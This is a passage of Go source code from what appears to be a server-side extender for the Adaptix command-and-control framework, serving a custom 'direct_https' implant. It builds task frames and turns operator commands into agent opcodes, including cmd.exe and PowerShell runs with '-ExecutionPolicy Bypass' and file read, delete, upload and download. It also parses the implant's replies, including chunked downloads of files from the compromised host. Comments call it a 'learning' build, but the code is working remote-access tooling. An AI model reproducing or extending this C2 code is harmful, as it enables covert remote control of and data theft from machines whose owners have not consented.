	sectioned = append(sectioned, compatBody...)
	return sectioned
}

func packTaskSectionEnvelopeV3(compatBody []byte, taskCount int) []byte {
	capabilities := uint32(directHTTPSCapTaskEnvelopeV2 | directHTTPSCapResultEnvelopeV2 | directHTTPSCapSectionEnvelopeV3)
	sectioned := buildTaskSectionBody(compatBody, taskCount, uint32(directHTTPSBeatV3SectionSchema), capabilities)
	return packTaskEnvelopeV2WithFlags(sectioned, taskCount, directHTTPSEnvelopeFlagSectioned)
}

func packSelfC2TaskFrameV4(tasks []selfC2NativeTaskRecord) []byte {
	capabilities := uint32(directHTTPSCapTaskEnvelopeV2 | directHTTPSCapResultEnvelopeV2 | directHTTPSCapSectionEnvelopeV3 | selfC2CapNativeFrameV4)
	meta := make([]byte, 0, 16)
	for _, value := range []uint32{uint32(selfC2BeatV4Schema), capabilities, uint32(len(tasks)), uint32(len(tasks))} {
		meta = appendLE32(meta, value)
	}

	sectioned := make([]byte, 0, 4+8+len(meta)+(8+16)*len(tasks))
	sectioned = appendLE32(sectioned, uint32(1+len(tasks)))
	sectioned = appendLE32(sectioned, directHTTPSSectionMeta)
	sectioned = appendLE32(sectioned, uint32(len(meta)))
	sectioned = append(sectioned, meta...)
	for _, task := range tasks {
		value := packSelfC2NativeTaskRecordValue(task)
		sectioned = appendLE32(sectioned, selfC2SectionTaskRecordV4)
		sectioned = appendLE32(sectioned, uint32(len(value)))
		sectioned = append(sectioned, value...)
	}
	return packSelfC2TaskFrameV4WithFlags(sectioned, len(tasks), directHTTPSEnvelopeFlagSectioned)
}

// packTaskEnvelopeV2 给服务端下发任务增加自研 v2 外壳：
//
//	DHT2 | schema/le32 | flags/le32 | task_count/le32 | body_len/le32 | legacy_body
//
// body 内部仍是当前学习 agent 已验证过的 opcode/参数/taskId 顺序，保证功能面不变。
func packTaskEnvelopeV2(body []byte, taskCount int) []byte {
	return packTaskEnvelopeV2WithFlags(body, taskCount, 0)
}

func packTaskEnvelopeV2WithFlags(body []byte, taskCount int, flags uint32) []byte {
	return packTaskFrameWithMagic(body, taskCount, flags, directHTTPSTaskV2Magic)
}

func packSelfC2TaskFrameV4WithFlags(body []byte, taskCount int, flags uint32) []byte {
	return packTaskFrameWithMagic(body, taskCount, flags, selfC2TaskFrameV4Magic)
}

func packTaskFrameWithMagic(body []byte, taskCount int, flags uint32, magic string) []byte {
	packData := make([]byte, 0, 20+len(body))
	packData = append(packData, []byte(magic)...)
	for _, value := range []uint32{directHTTPSTaskV2Schema, flags, uint32(taskCount), uint32(len(body))} {
		packData = appendLE32(packData, value)
	}
	packData = append(packData, body...)
	return packData
}

// PivotPackData 是 pivot 转发接口；direct_https 不支持，所以直接返回错误。
func (ext *ExtenderAgent) PivotPackData(pivotId string, data []byte) (adaptix.TaskData, error) {
	return adaptix.TaskData{}, errors.New("direct_https agent does not support nested task forwarding")
}

// CreateCommand 把用户在 UI/Raw API 里输入的命令转换成 agent 端 opcode 和参数。
// 本恢复版只开放学习目标需要的命令面：hello、cmd/powershell、基础文件 CRUD、upload/download。
func (ext *ExtenderAgent) CreateCommand(agentData adaptix.AgentData, args map[string]any) (adaptix.TaskData, adaptix.ConsoleMessageData, error) {
	var (
		taskData    adaptix.TaskData
		messageData adaptix.ConsoleMessageData
		err         error
	)

	command, ok := args["command"].(string)
	if !ok {
		return taskData, messageData, errors.New("'command' must be set")
	}

	taskData = adaptix.TaskData{Type: adaptix.TASK_TYPE_TASK, Sync: true}
	messageData = adaptix.ConsoleMessageData{Status: adaptix.MESSAGE_INFO, Text: ""}
	messageData.Message, _ = args["message"].(string)

	var array []interface{}
	switch command {
	case "cmd":
		var commandLine string
		commandLine, err = getStringArg(args, "command_line")
		if err != nil {
			goto RET
		}
		taskData.Type = adaptix.TASK_TYPE_JOB
		programArgs := Ts.TsConvertUTF8toCp("cmd.exe /d /c "+commandLine, agentData.ACP)
		messageData.Message = "Task: execute cmd.exe command"
		array = []interface{}{COMMAND_PS_RUN, true, false, 0, programArgs}

	case "powershell":
		var commandLine string
		commandLine, err = getStringArg(args, "command_line")
		if err != nil {
			goto RET
		}
		taskData.Type = adaptix.TASK_TYPE_JOB
		programArgs := Ts.TsConvertUTF8toCp("powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command "+commandLine, agentData.ACP)
		messageData.Message = "Task: execute PowerShell command"
		array = []interface{}{COMMAND_PS_RUN, true, false, 0, programArgs}

	case "cat":
		var path string
		path, err = getStringArg(args, "path")
		if err != nil {
			goto RET
		}
		array = []interface{}{COMMAND_CAT, Ts.TsConvertUTF8toCp(path, agentData.ACP)}

	case "cd":
		var path string
		path, err = getStringArg(args, "path")
		if err != nil {
			goto RET
		}
		array = []interface{}{COMMAND_CD, Ts.TsConvertUTF8toCp(path, agentData.ACP)}

	case "cp":
		var src, dst string
		src, err = getStringArg(args, "src")
		if err != nil {
			goto RET
		}
		dst, err = getStringArg(args, "dst")
		if err != nil {
			goto RET
		}
		array = []interface{}{COMMAND_COPY, Ts.TsConvertUTF8toCp(src, agentData.ACP), Ts.TsConvertUTF8toCp(dst, agentData.ACP)}

	case "download":
		var path string
		path, err = getStringArg(args, "file")
		if err != nil {
			goto RET
		}
		array = []interface{}{COMMAND_DOWNLOAD, Ts.TsConvertUTF8toCp(path, agentData.ACP)}

	case "disks":
		messageData.Message = "Task: list logical drives"
		array = []interface{}{COMMAND_DISKS}

	case "hello":
		messageData.Message = "Task: run hello test"
		array = []interface{}{COMMAND_HELLO}

	case "ls":
		var dir string
		dir, err = getStringArg(args, "path")
		if err != nil {
			goto RET
		}
		array = []interface{}{COMMAND_LS, Ts.TsConvertUTF8toCp(dir, agentData.ACP)}

	case "mv":
		var src, dst string
		src, err = getStringArg(args, "src")
		if err != nil {
			goto RET
		}
		dst, err = getStringArg(args, "dst")
		if err != nil {
			goto RET
		}
		array = []interface{}{COMMAND_MV, Ts.TsConvertUTF8toCp(src, agentData.ACP), Ts.TsConvertUTF8toCp(dst, agentData.ACP)}

	case "mkdir":
		var path string
		path, err = getStringArg(args, "path")
		if err != nil {
			goto RET
		}
		array = []interface{}{COMMAND_MKDIR, Ts.TsConvertUTF8toCp(path, agentData.ACP)}

	case "pwd":
		array = []interface{}{COMMAND_PWD}

	case "rm":
		var path string
		path, err = getStringArg(args, "path")
		if err != nil {
			goto RET
		}
		array = []interface{}{COMMAND_RM, Ts.TsConvertUTF8toCp(path, agentData.ACP)}

	case "upload":
		var fileName, localFile string
		var fileContent []byte
		fileName, err = getStringArg(args, "remote_path")
		if err != nil {
			goto RET
		}
		localFile, err = getStringArg(args, "local_file")
		if err != nil {
			goto RET
		}
		fileContent, err = base64.StdEncoding.DecodeString(localFile)
		if err != nil {
			goto RET
		}
		memoryId := CreateTaskCommandSaveMemory(Ts, agentData.Id, fileContent)
		array = []interface{}{COMMAND_UPLOAD, memoryId, Ts.TsConvertUTF8toCp(fileName, agentData.ACP)}

	default:
		err = fmt.Errorf("command '%s' is not available in the restored direct_https learning surface", command)
		goto RET
	}

	taskData.Data, err = PackArray(array)

RET:
	return taskData, messageData, err
}

// ProcessData 解析 agent 回包，把 cmd/powershell、文件 CRUD、上传下载等结果更新回 Adaptix 任务界面。
func (ext *ExtenderAgent) ProcessData(agentData adaptix.AgentData, decryptedData []byte) error {
	var outTasks []adaptix.TaskData

	taskData := adaptix.TaskData{
		Type:        adaptix.TASK_TYPE_TASK,
		AgentId:     agentData.Id,
		FinishDate:  time.Now().Unix(),
		MessageType: adaptix.MESSAGE_SUCCESS,
		Completed:   true,
		Sync:        true,
	}

	recordData, err := unpackResultEnvelope(decryptedData)
	if err != nil {
		return err
	}

	packer := CreatePacker(recordData)

	for packer.Size() >= 8 {
		if false == packer.CheckPacker([]string{"int", "int"}) {
			goto HANDLER
		}

		taskID := packer.ParseInt32()
		commandID := uint(packer.ParseInt32())
		task := taskData
		task.TaskId = fmt.Sprintf("%08x", taskID)

		switch commandID {
		case COMMAND_CAT:
			if false == packer.CheckPacker([]string{"array", "array"}) {
				goto HANDLER
			}
			path := Ts.TsConvertCpToUTF8(packer.ParseString(), agentData.ACP)
			fileContent := packer.ParseBytes()
			task.Message = fmt.Sprintf("'%v' file content:", path)
			task.ClearText = string(fileContent)

		case COMMAND_CD:
			if false == packer.CheckPacker([]string{"array"}) {
				goto HANDLER
			}
			path := Ts.TsConvertCpToUTF8(packer.ParseString(), agentData.ACP)
			task.Message = "Current working directory:"
			task.ClearText = path

		case COMMAND_COPY:
			task.Message = "File copied successfully"

		case COMMAND_DOWNLOAD:
			if false == packer.CheckPacker([]string{"int", "byte"}) {
				goto HANDLER
			}
			fileID := fmt.Sprintf("%08x", packer.ParseInt32())
			downloadCommand := packer.ParseInt8()
			if downloadCommand == DOWNLOAD_START {
				if false == packer.CheckPacker([]string{"long", "array"}) {
					goto HANDLER
				}
				fileSize := packer.ParseInt64()
				fileName := Ts.TsConvertCpToUTF8(packer.ParseString(), agentData.ACP)
				task.Message = fmt.Sprintf("The download of the '%s' file (%v bytes) has started: [fid %v]", fileName, fileSize, fileID)
				task.Completed = false
				_ = Ts.TsDownloadAdd(agentData.Id, fileID, fileName, int64(fileSize))
			} else if downloadCommand == DOWNLOAD_CONTINUE {
				if false == packer.CheckPacker([]string{"array"}) {
					goto HANDLER
				}
				fileContent := packer.ParseBytes()
				_ = Ts.TsDownloadUpdate(fileID, adaptix.DOWNLOAD_STATE_RUNNING, fileContent)
				continue
			} else if downloadCommand == DOWNLOAD_FINISH {
				task.Message = fmt.Sprintf("File download complete: [fid %v]", fileID)
				_ = Ts.TsDownloadClose(fileID, adaptix.DOWNLOAD_STATE_FINISHED)
			}

		case COMMAND_DOWNLOAD_STATE:
			if false == packer.CheckPacker([]string{"int", "byte"}) {
				goto HANDLER
			}
			fileID := fmt.Sprintf("%08x", packer.ParseInt32())
			downloadState := packer.ParseInt8()
			if downloadState == adaptix.DOWNLOAD_STATE_STOPPED {
				task.Message = fmt.Sprintf("Download '%v' stopped", fileID)
				_ = Ts.TsDownloadUpdate(fileID, adaptix.DOWNLOAD_STATE_STOPPED, []byte(""))
			} else if downloadState == adaptix.DOWNLOAD_STATE_RUNNING {
				task.Message = fmt.Sprintf("Download '%v' resumed", fileID)
				_ = Ts.TsDownloadUpdate(fileID, adaptix.DOWNLOAD_STATE_RUNNING, []byte(""))
			} else if downloadState == adaptix.DOWNLOAD_STATE_CANCELED {
				task.Message = fmt.Sprintf("Download '%v' canceled", fileID)
				_ = Ts.TsDownloadClose(fileID, adaptix.DOWNLOAD_STATE_CANCELED)
			} else {
				task.Message = fmt.Sprintf("Download '%v' state changed to %d", fileID, downloadState)
			}

		case COMMAND_HELLO:
			if false == packer.CheckPacker([]string{"array"}) {
				goto HANDLER
			}
			task.Message = "Hello command result:"
			task.ClearText = string(packer.ParseBytes())

		case COMMAND_JOB:
			if false == packer.CheckPacker([]string{"byte", "byte"}) {
				goto HANDLER
			}
			_ = packer.ParseInt8()
			state := packer.ParseInt8()
			if state == JOB_STATE_RUNNING {
				if false == packer.CheckPacker([]string{"array"}) {
					goto HANDLER
				}
				task.Completed = false
				jobOutput := Ts.TsConvertCpToUTF8(packer.ParseString(), agentData.OemCP)
				task.Message = fmt.Sprintf("Job [%v] output:", task.TaskId)
				task.ClearText = jobOutput
			} else if state == JOB_STATE_KILLED {
				task.Completed = true
				task.MessageType = adaptix.MESSAGE_INFO
				task.Message = fmt.Sprintf("Job [%v] canceled", task.TaskId)
			} else if state == JOB_STATE_FINISHED {
				task.Completed = true
				task.Message = fmt.Sprintf("Job [%v] finished", task.TaskId)
			}

		case COMMAND_LS:
			if false == packer.CheckPacker([]string{"byte"}) {
				goto HANDLER
			}
			result := packer.ParseInt8()
			var items []adaptix.ListingFileDataWin
			var rootPath string
			if result == 0 {
				if false == packer.CheckPacker([]string{"int"}) {
					goto HANDLER
				}
				errorCode := packer.ParseInt32()
				task.Message = fmt.Sprintf("Error [%d]: %s", errorCode, Ts.TsWin32Error(errorCode))
				task.MessageType = adaptix.MESSAGE_ERROR
			} else {
				if false == packer.CheckPacker([]string{"array", "int"}) {
					goto HANDLER
				}
				rootPath = Ts.TsConvertCpToUTF8(packer.ParseString(), agentData.ACP)
				rootPath, _ = strings.CutSuffix(rootPath, "\\*")
				filesCount := int(packer.ParseInt32())
				if filesCount == 0 {
					task.Message = fmt.Sprintf("The '%s' directory is EMPTY", rootPath)
				} else {
					var folders []adaptix.ListingFileDataWin
					var files []adaptix.ListingFileDataWin
					for i := 0; i < filesCount; i++ {
						if false == packer.CheckPacker([]string{"byte", "long", "int", "array"}) {
							goto HANDLER
						}
						isDir := packer.ParseInt8()
						fileData := adaptix.ListingFileDataWin{
							IsDir:    false,
							Size:     int64(packer.ParseInt64()),
							Date:     int64(packer.ParseInt32()),
							Filename: Ts.TsConvertCpToUTF8(packer.ParseString(), agentData.ACP),
						}
						if isDir > 0 {
							fileData.IsDir = true
							folders = append(folders, fileData)
						} else {
							files = append(files, fileData)
						}
					}
					items = append(folders, files...)
					outputText := fmt.Sprintf(" %-8s %-14s %-20s  %s\n", "Type", "Size", "Last Modified      ", "Name")
					outputText += fmt.Sprintf(" %-8s %-14s %-20s  %s", "----", "---------", "----------------   ", "----")
					for _, item := range items {
						t := time.Unix(item.Date, 0).UTC()
						lastWrite := fmt.Sprintf("%02d/%02d/%d %02d:%02d", t.Day(), t.Month(), t.Year(), t.Hour(), t.Minute())
						if item.IsDir {
							outputText += fmt.Sprintf("\n %-8s %-14s %-20s  %-8v", "dir", "", lastWrite, item.Filename)
						} else {
							outputText += fmt.Sprintf("\n %-8s %-14s %-20s  %-8v", "", SizeBytesToFormat(item.Size), lastWrite, item.Filename)
						}
					}
					task.Message = fmt.Sprintf("Listing '%s'", rootPath)
					task.ClearText = outputText
				}
			}
			Ts.TsClientGuiFilesWindows(task, rootPath, items)

		case COMMAND_DISKS:
			if false == packer.CheckPacker([]string{"byte"}) {
				goto HANDLER
			}
			result := packer.ParseInt8()
			if result == 0 {
				if false == packer.CheckPacker([]string{"int"}) {
					goto HANDLER
				}
				errorCode := packer.ParseInt32()
				task.Message = fmt.Sprintf("Error [%d]: %s", errorCode, Ts.TsWin32Error(errorCode))
				task.MessageType = adaptix.MESSAGE_ERROR
				break
			}
			if false == packer.CheckPacker([]string{"int"}) {
				goto HANDLER
			}
			driveCount := packer.ParseInt32()
			outputText := "Drive   Type\n-----   ----"
			for i := uint(0); i < driveCount; i++ {
				if false == packer.CheckPacker([]string{"byte", "int"}) {
					goto HANDLER
				}
				drive := packer.ParseInt8()
				driveType := packer.ParseInt32()
				typeName := "unknown"
				switch driveType {
				case 2:
					typeName = "removable"
				case 3:
					typeName = "fixed"
				case 4:
					typeName = "remote"
				case 5:
					typeName = "cdrom"
				case 6:
					typeName = "ramdisk"
				}
				outputText += fmt.Sprintf("\n%c:      %s (%d)", drive, typeName, driveType)
			}
			task.Message = "Logical drives:"
			task.ClearText = outputText

		case COMMAND_MKDIR:
			if false == packer.CheckPacker([]string{"array"}) {
				goto HANDLER
			}
			path := Ts.TsConvertCpToUTF8(packer.ParseString(), agentData.ACP)
			task.Message = fmt.Sprintf("Directory '%v' created successfully", path)

		case COMMAND_MV:
			task.Message = "File moved successfully"

		case COMMAND_PS_RUN:
			if false == packer.CheckPacker([]string{"int", "byte", "array"}) {
				goto HANDLER
			}
			pid := packer.ParseInt32()
			isOutput := packer.ParseInt8()
			prog := Ts.TsConvertCpToUTF8(packer.ParseString(), agentData.ACP)
			status := "no output"
			if isOutput > 0 {
				status = "with output"
			}
			task.Completed = false
			task.Message = fmt.Sprintf("Program %v started with PID %d (output - %v)", prog, pid, status)

		case COMMAND_PWD:
			if false == packer.CheckPacker([]string{"array"}) {
				goto HANDLER
			}
			path := Ts.TsConvertCpToUTF8(packer.ParseString(), agentData.ACP)
			task.Message = "Current working directory:"
			task.ClearText = path

		case COMMAND_RM:
			if false == packer.CheckPacker([]string{"byte"}) {
				goto HANDLER
			}
			result := packer.ParseInt8()
			if result == 0 {
				task.Message = "File deleted successfully"
			} else {
				task.Message = "Directory deleted successfully"
			}

		case COMMAND_UPLOAD:
			task.Message = "File successfully uploaded"
			Ts.TsClientGuiFilesStatus(task)

		case COMMAND_ERROR:
			if false == packer.CheckPacker([]string{"int"}) {
				goto HANDLER
			}
			errorCode := packer.ParseInt32()
			task.Message = fmt.Sprintf("Error [%d]: %s", errorCode, Ts.TsWin32Error(errorCode))
			task.MessageType = adaptix.MESSAGE_ERROR

		default:
			continue
		}

		outTasks = append(outTasks, task)
	}

HANDLER:
	for _, task := range outTasks {
		Ts.TsTaskUpdate(agentData.Id, task)
	}
	return nil
}

// unpackResultEnvelope 兼容解析 agent 回传：
//
//	v2:     DHR2 | schema/be32 | flags/be32 | body_len/be32 | legacy_records
//	legacy: total_len/be32 | legacy_records
//
// 这样可以在切换运行中 agent 时降低回滚成本；server 侧统一把返回值交给旧记录解析器。
func unpackResultEnvelope(decryptedData []byte) ([]byte, error) {
	if len(decryptedData) >= 16 {
		packer := CreatePacker(decryptedData)
		first := packer.ParseInt32()
		if first == directHTTPSResultV2Magic || first == selfC2ResultFrameV4Magic {
			schema := packer.ParseInt32()
			if schema != directHTTPSResultV2Schema {
				return nil, fmt.Errorf("unsupported direct_https result envelope schema %d", schema)
			}
			flags := uint32(packer.ParseInt32())
			bodyLen := packer.ParseInt32()
			if bodyLen != packer.Size() {
				return nil, errors.New("failed to unmarshal v2 result envelope")
			}
			body := decryptedData[16:]
			if flags&directHTTPSEnvelopeFlagSectioned != 0 {
				return unpackSectionedResultBody(body)
			}
			return body, nil
		}
	}

	packer := CreatePacker(decryptedData)
	if false == packer.CheckPacker([]string{"int"}) {
		return nil, errors.New("failed to unmarshal message")
	}
	size := packer.ParseInt32()
	if size-4 != packer.Size() {
		return nil, errors.New("failed to unmarshal message")
	}
	return decryptedData[4:], nil
}

func unpackSectionedResultBody(body []byte) ([]byte, error) {
	packer := CreatePacker(body)
	if false == packer.CheckPacker([]string{"int"}) {
		return nil, errors.New("failed to unmarshal sectioned result body")
	}
	sectionCount := packer.ParseInt32()
	for i := uint(0); i < sectionCount; i++ {
		if false == packer.CheckPacker([]string{"int", "int"}) {
			return nil, errors.New("failed to unmarshal sectioned result header")
		}
		sectionType := uint32(packer.ParseInt32())
		sectionLen := packer.ParseInt32()
		if packer.Size() < sectionLen {
			return nil, errors.New("failed to unmarshal sectioned result length")
		}
		sectionValue := packer.buffer[:sectionLen]
		packer.buffer = packer.buffer[sectionLen:]
		if sectionType == directHTTPSSectionLegacyRecords {
			return sectionValue, nil
		}
		if sectionType == selfC2SectionResultStreamV4 {
			return unpackSelfC2ResultStreamV4(sectionValue)
		}
		if sectionType == selfC2SectionResultBundleV4 {
			return unpackSelfC2ResultBundleV4(sectionValue)
		}
	}
	return nil, errors.New("sectioned result body does not contain a supported result stream")
}

func unpackSelfC2ResultBundleV4(value []byte) ([]byte, error) {
	packer := CreatePacker(value)
	if false == packer.CheckPacker([]string{"int", "int", "int", "int"}) {
		return nil, errors.New("failed to unmarshal native result bundle header")
	}
	schema := uint32(packer.ParseInt32())
	if schema != selfC2ResultBundleV4Schema {
		return nil, fmt.Errorf("unsupported native result bundle schema %d", schema)
	}
	codec := uint32(packer.ParseInt32())
	_ = packer.ParseInt32()
	payloadLen := packer.ParseInt32()
	if packer.Size() < payloadLen {
		return nil, errors.New("failed to unmarshal native result bundle payload length")
	}
	payload := packer.buffer[:payloadLen]
	if codec == selfC2ResultCodecCompatBody {
		return payload, nil
	}
	if codec == selfC2ResultCodecNativeFields {
		return unpackSelfC2NativeResultCodecV2(payload)
	}
	return nil, fmt.Errorf("unsupported native result bundle codec %d", codec)
}

func selfC2CompatCommandFromAction(actionID uint32) (uint32, bool) {
	switch actionID {
	case selfC2ActionHello:
		return COMMAND_HELLO, true
	case selfC2ActionPwd:
		return COMMAND_PWD, true
	case selfC2ActionDisks:
		return COMMAND_DISKS, true
	default:
		return 0, false
	}
}

func packCompatBytesResult(taskID uint32, commandID uint32, value []byte) []byte {
	body := make([]byte, 0, 12+len(value))
	body = appendBE32(body, taskID)
	body = appendBE32(body, commandID)
	body = appendBE32(body, uint32(len(value)))
	body = append(body, value...)
	return body
}

func unpackSelfC2NativeResultCodecV2(payload []byte) ([]byte, error) {
	packer := CreatePacker(payload)
	if false == packer.CheckPacker([]string{"int"}) {
		return nil, errors.New("failed to unmarshal native result codec header")
	}
	recordCount := packer.ParseInt32()
	compat := []byte{}
	for i := uint(0); i < recordCount; i++ {
		if false == packer.CheckPacker([]string{"int", "int", "int", "int", "int"}) {
			return nil, errors.New("failed to unmarshal native result record header")
		}
		recordSchema := uint32(packer.ParseInt32())
		if recordSchema != selfC2NativeResultRecordV4Schema {
			return nil, fmt.Errorf("unsupported native result record schema %d", recordSchema)
		}
		taskID := uint32(packer.ParseInt32())
		actionID := uint32(packer.ParseInt32())
		fieldType := uint32(packer.ParseInt32())
		fieldLen := packer.ParseInt32()
		if packer.Size() < fieldLen {
			return nil, errors.New("failed to unmarshal native result record payload length")
		}
		fieldValue := packer.buffer[:fieldLen]
		packer.buffer = packer.buffer[fieldLen:]

		commandID, ok := selfC2CompatCommandFromAction(actionID)
		if !ok {
			return nil, fmt.Errorf("unsupported native result action %d", actionID)
		}
		switch actionID {
		case selfC2ActionHello:
			if fieldType != selfC2NativeResultFieldText {
				return nil, fmt.Errorf("unexpected native hello field type %d", fieldType)
			}
		case selfC2ActionPwd:
			if fieldType != selfC2NativeResultFieldPath {
				return nil, fmt.Errorf("unexpected native pwd field type %d", fieldType)
			}
		}
		compat = append(compat, packCompatBytesResult(taskID, commandID, fieldValue)...)
	}
	return compat, nil
}

func unpackSelfC2ResultStreamV4(value []byte) ([]byte, error) {
	packer := CreatePacker(value)
	if false == packer.CheckPacker([]string{"int", "int"}) {
		return nil, errors.New("failed to unmarshal native result stream header")
	}
	schema := uint32(packer.ParseInt32())
	if schema != selfC2ResultStreamV4Schema {
		return nil, fmt.Errorf("unsupported native result stream schema %d", schema)
	}
	streamLen := packer.ParseInt32()
	if packer.Size() < streamLen {
		return nil, errors.New("failed to unmarshal native result stream length")
	}
	return packer.buffer[:streamLen], nil
}
